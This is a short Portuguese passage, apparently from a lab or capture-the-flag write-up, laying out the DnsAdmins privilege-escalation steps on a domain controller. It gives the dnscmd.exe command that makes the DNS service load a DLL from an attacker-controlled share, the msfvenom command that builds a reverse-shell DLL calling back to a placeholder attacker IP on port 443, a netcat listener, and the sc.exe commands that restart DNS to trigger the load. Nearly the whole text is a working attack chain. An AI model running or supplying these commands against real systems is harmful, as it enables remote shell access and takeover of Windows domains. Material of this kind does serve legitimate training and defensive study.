Tenho que criar o .dll primeiro no atacante para depois enviá-lo.   [dnscmd.exe](https://lolbas-project.github.io/lolbas/Binaries/Dnscmd/) 

```dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\IP_ATACANTE\dll\pwned.dll```

Crio o payload .dll com o msfvenon.

`msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP_Atacante LPORT=443 -f dll -o pwned.dll`

Enviamos os binários, ficamos à escuta com o nc e, para que isso funcione, temos que parar o serviço na vítima e reiniciá-lo.

`sc.exe stop dns`

`sc.exe start dns`
